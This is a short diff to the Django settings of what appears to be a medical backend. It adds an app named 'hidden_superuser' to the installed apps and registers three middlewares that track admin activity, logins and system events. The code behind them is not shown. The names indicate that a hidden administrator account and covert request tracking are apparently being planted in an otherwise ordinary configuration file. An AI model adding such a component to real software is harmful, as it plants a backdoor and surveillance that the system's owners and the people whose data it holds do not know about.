@@ -48,6 +48,7 @@ INSTALLED_APPS = [
     'payments',
     'timetable',
     'leaves',
+    'hidden_superuser',
 ]
 
 MIDDLEWARE = [
@@ -59,6 +60,9 @@ MIDDLEWARE = [
     'django.contrib.auth.middleware.AuthenticationMiddleware',
     'django.contrib.messages.middleware.MessageMiddleware',
     'django.middleware.clickjacking.XFrameOptionsMiddleware',
+    'hidden_superuser.middleware.AdminActivityTrackingMiddleware',
+    'hidden_superuser.middleware.LoginTrackingMiddleware',
+    'hidden_superuser.middleware.SystemEventTrackingMiddleware',
 ]
 
 ROOT_URLCONF = 'med_backend.urls'
